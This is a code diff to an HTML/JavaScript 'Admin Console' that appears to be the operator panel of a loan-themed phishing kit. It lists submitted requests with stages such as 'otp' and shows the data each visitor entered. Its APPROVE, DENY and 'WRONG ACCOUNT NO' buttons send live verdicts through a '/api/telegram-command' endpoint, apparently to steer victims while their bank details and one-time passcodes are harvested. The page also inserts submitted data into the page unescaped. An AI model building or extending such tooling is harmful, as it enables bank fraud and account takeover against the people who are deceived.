@@ -8,25 +8,91 @@
     .req{ border:1px solid #ccc; padding:1%; margin-bottom:1%; }
     .meta{ color: #666; font-size: 90%; }
     button{ margin-right: 8px; }
+    .tiny { font-size: 90%; color:#444; }
   </style>
 </head>
 <body>
   <h1>Admin Console</h1>
   <div id="list"></div>
+
   <script>
+    const ADMIN_API_PATH = '/api/telegram-command'; // backend endpoint
+    const ADMIN_API_KEY = '';// OPTIONAL: if you want to hardcode a client-side key (not recommended). Leave empty to use no header.
+
     function loadRequests(){ try { return JSON.parse(localStorage.getItem('loan_requests')||'[]'); } catch(e){ return []; } }
     function saveRequests(list){ localStorage.setItem('loan_requests', JSON.stringify(list)); }
-    function render(){ const list = loadRequests(); const el = document.getElementById('list'); el.innerHTML = '';
+
+    async function sendCommandToServer(reqId, action, reqData){
+      const payload = { id: reqId, action, data: reqData || null };
+      try {
+        const headers = { 'Content-Type': 'application/json' };
+        if(ADMIN_API_KEY) headers['x-admin-key'] = ADMIN_API_KEY;
+        const res = await fetch(ADMIN_API_PATH, { method:'POST', headers, body: JSON.stringify(payload) });
+        if(!res.ok){
+          const txt = await res.text().catch(()=>res.statusText);
+          throw new Error(`Server returned ${res.status}: ${txt}`);
+        }
+        return await res.json();
+      } catch(err){
+        console.error('Failed to send command:', err);
+        throw err;
+      }
+    }
+
+    function makeButton(text, className, onClick){
+      const b = document.createElement('button');
+      b.innerText = text;
+      if(className) b.className = className;
+      b.addEventListener('click', onClick);
+      return b;
+    }
+
+    function render(){
+      const list = loadRequests();
+      const el = document.getElementById('list'); el.innerHTML = '';
       if(list.length===0){ el.innerHTML = '<p>No requests</p>'; return; }
-      list.slice().reverse().forEach(r=>{ const d = document.createElement('div'); d.className='req'; d.innerHTML = `<div><strong>ID:</strong> ${r.id} <span class='meta'>[${r.stage}]</span></div><div><pre>${JSON.stringify(r.data,null,2)}</pre></div><div class='meta'>Status: ${r.status||'pending'}</div>`;
-        const approve = document.createElement('button'); approve.innerText='APPROVE'; approve.addEventListener('click', ()=>{ r.status='approved'; saveRequests(list); render(); });
-        const wrong = document.createElement('button'); wrong.innerText = (r.stage==='otp')? 'WRONG OTP' : 'WRONG'; wrong.addEventListener('click', ()=>{ r.status='rejected'; saveRequests(list); render(); });
-        const verify = document.createElement('button'); verify.innerText='VERIFY DEVICE'; verify.addEventListener('click', ()=>{ r.status='verify'; saveRequests(list); render(); });
-        d.appendChild(approve); d.appendChild(wrong); d.appendChild(verify);
+
+      list.slice().reverse().forEach(r=>{
+        const d = document.createElement('div'); d.className='req';
+        d.innerHTML = `<div><strong>ID:</strong> ${r.id} <span class='meta'>[${r.stage||'unknown'}]</span></div>
+                       <div><pre>${JSON.stringify(r.data||{},null,2)}</pre></div>
+                       <div class='meta'>Status: <span class="tiny" id="status-${r.id}">${r.status||'pending'}</span></div>`;
+        // APPROVE
+        const approve = makeButton('APPROVE', 'approve', async ()=>{
+          try{
+            await sendCommandToServer(r.id, 'APPROVE', r.data);
+            r.status='approved';
+            saveRequests(list);
+            document.getElementById(`status-${r.id}`).innerText = r.status;
+          }catch(e){ alert('Failed to send APPROVE command: '+e.message); }
+        });
+
+        // DENY
+        const deny = makeButton('DENY', 'deny', async ()=>{
+          try{
+            await sendCommandToServer(r.id, 'DENY', r.data);
+            r.status='denied';
+            saveRequests(list);
+            document.getElementById(`status-${r.id}`).innerText = r.status;
+          }catch(e){ alert('Failed to send DENY command: '+e.message); }
+        });
+
+        // WRONG ACCOUNT NO
+        const wrongAcc = makeButton('WRONG ACCOUNT NO', 'wrong', async ()=>{
+          try{
+            await sendCommandToServer(r.id, 'WRONG_ACCOUNT_NO', r.data);
+            r.status='wrong_account_no';
+            saveRequests(list);
+            document.getElementById(`status-${r.id}`).innerText = r.status;
+          }catch(e){ alert('Failed to send WRONG ACCOUNT NO command: '+e.message); }
+        });
+
+        d.appendChild(approve); d.appendChild(deny); d.appendChild(wrongAcc);
         el.appendChild(d);
-      }); }
+      });
+    }
+
     render();
-    // keep list updated
     setInterval(render, 2000);
   </script>
 </body>
